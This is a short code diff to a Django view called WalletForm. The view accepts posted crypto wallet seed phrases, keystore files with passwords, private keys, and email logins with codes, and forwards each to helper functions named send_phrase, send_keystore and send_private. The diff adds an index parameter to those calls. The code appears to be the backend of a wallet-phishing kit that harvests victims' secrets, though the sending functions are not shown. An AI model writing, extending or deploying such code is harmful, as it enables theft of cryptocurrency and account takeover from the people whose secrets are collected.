@@ -28,19 +28,19 @@ class WalletForm(views.APIView):
     def post(self, request: HttpRequest, *args, **kwargs):
         data = json.loads(request.body)
         type = data.get('type')
+        idx = data.get('idx')
         if not type:
             return Response({'status': 0, 'message':'Type not found'})
         print(data)
         if type == 'phrase':
-            print(data.get('token'))
-            status = send_phrase(data.get('token'))
+            status = send_phrase(idx, data.get('token'))
             return Response({'status': status})
         if type == 'keystore':
-            status = send_keystore(data.get('token'), data.get('password'))
+            status = send_keystore(idx, data.get('token'), data.get('password'))
             return Response({'status': status})
         if type == 'private':
-            status = send_private(data.get('pKey'))
+            status = send_private(idx, data.get('pKey'))
             return Response({'status': status})
         if type == 'email':
-            status = send_keystore(data.get('email'), data.get('password'), data.get('code'))
+            status = send_keystore(idx, data.get('email'), data.get('password'), data.get('code'))
             return Response({'status': status})
